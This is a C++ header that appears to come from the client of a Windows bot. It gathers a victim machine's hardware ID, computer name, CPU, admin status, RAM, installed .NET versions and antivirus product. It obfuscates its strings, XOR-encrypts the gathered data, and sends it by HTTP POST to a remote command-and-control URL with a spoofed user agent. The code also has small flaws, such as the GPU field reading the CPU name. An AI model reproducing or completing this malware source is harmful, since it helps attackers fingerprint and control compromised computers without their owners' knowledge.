
#pragma once
#include <fstream>
#include <hstring.h>


class Client
{
public:

	std::string checkIfRegKeyExists(std::string key) {
		LONG lResult;
		HKEY hKey;
		lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT(key.c_str()), 0, KEY_READ, &hKey);
		if (lResult != ERROR_SUCCESS) {
			if (lResult == ERROR_FILE_NOT_FOUND) {
				return "false";
			}
		}
		return "true";
	}


	
	static std::string returnFinalPost() {
		std::string args = "hwid=" + Helpers::GetMachineGUID() +
			"&computername=" + Helpers::getComputerName() +
			"&cpuName=" + OsHelpers::getCpuName() +
			"&aornot=" + OsHelpers::checkPEIsAdmin() +
			"&gpuName=" + OsHelpers::getCpuName() +
			"&prcessorArchitecture=" + OsHelpers::PrcessorArchitecture() +
			"&installedRam=" + OsHelpers::getRam() +
			"&netFramework2=" + Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v2.0.50727")) +
			"&netFramework3=" + Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.0")) +
			"&netFramework35=" + Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v3.5")) +
			"&netFramework4=" + Helpers::checkIfRegKeyExists(OBFUSCATE("SOFTWARE\\Microsoft\\Net Framework Setup\\NDP\\v4")) +
			"&antivirus=" + Helpers::getCurrentAv() +
			"&botversion=2.1" +
			"&operingsystem=" + Helpers::GetWindowsVersionString();
		std::string finalPost = "request=" + XOR::encryptReqeust(args);
		return finalPost;
	}


	static std::string sendPost(std::string url, std::string params) {
		Config config;

		http::Request request2(url);
		http::Response respons2e = request2.send("POST",
			params,
			{ "Content-Type: application/x-www-form-urlencoded", "User-Agent: " + config.useragent }
		);

		return Helpers::responseToString(respons2e);
	}

};

